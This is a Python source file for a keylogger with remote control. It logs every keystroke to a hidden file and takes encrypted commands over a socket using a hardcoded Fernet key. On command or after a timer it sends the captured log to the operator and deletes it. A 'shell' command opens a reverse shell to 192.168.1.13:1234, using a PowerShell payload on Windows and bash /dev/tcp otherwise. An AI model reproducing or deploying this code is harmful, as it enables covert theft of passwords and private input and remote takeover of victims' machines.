import platform
import time
import os  
import client
import signal
from threading import Thread
from pynput.keyboard import Listener, Controller
from cryptography.fernet import Fernet
import subprocess
import platform

threadtab = []
def get_platform():
    return platform.system()

def on_press(key):
    keyFormat = "key_press:{0}\n".format(key)
    with open('.document1.txt', '+a') as file:
        file.write(keyFormat)

def on_release(key):
    keyFormat = "key_release{0}\n".format(key)
    with open('.document1.txt', '+a') as file:
        file.write(keyFormat)

def receive_message(mysocket,listener):
    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
    cipher_suite = Fernet(key)

    while True:
        try:
            print("Waiting for data...")
            data = mysocket.recv(1024)
            decrypted_data = cipher_suite.decrypt(data).decode("utf-8")
            print(decrypted_data)
            if decrypted_data == "kill":
                listener.stop()
                client.send_file_securely(mysocket)
                client.stop_and_delete_capture_file()
            elif "shell" == decrypted_data:
                if platform.uname() == 'Windows':
                    reverse_payload = "$client = New-Object System.Net.Sockets.TcpClient('192.168.1.13',1234) $stream = $client.GetStream() [byte[]]$bytes = 0..65535|%{0} while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)$sendback = (iex $data 2>&1 | Out-String )$sendback2  = $sendback + 'PS ' + (pwd).Path + '> '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)$stream.Write($sendbyte,0,$sendbyte.Length)$stream.Flush()}$client.Close()"
                    os.system(f"powershell -c {reverse_payload}")
                else:
                    reverse_payload = "bash -i >& /dev/tcp/192.168.1.13/1234 0>&1"
                    os.system(reverse_payload)
                    
        except Exception as e:
            break                        
        
def func_handle_time(period,listener,mysocket):
    try:
        time.sleep(period)
        listener.stop()
        client.send_file_securely(mysocket)
        client.stop_and_delete_capture_file()
    except Exception:
        pass

def listen_keyboard(mysocket):
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            Thread(target=receive_message,args=(mysocket,listener)).start()
            Thread(target=func_handle_time,args=(10.0,listener,mysocket)).start()
            listener.join()
    except Exception:
        pass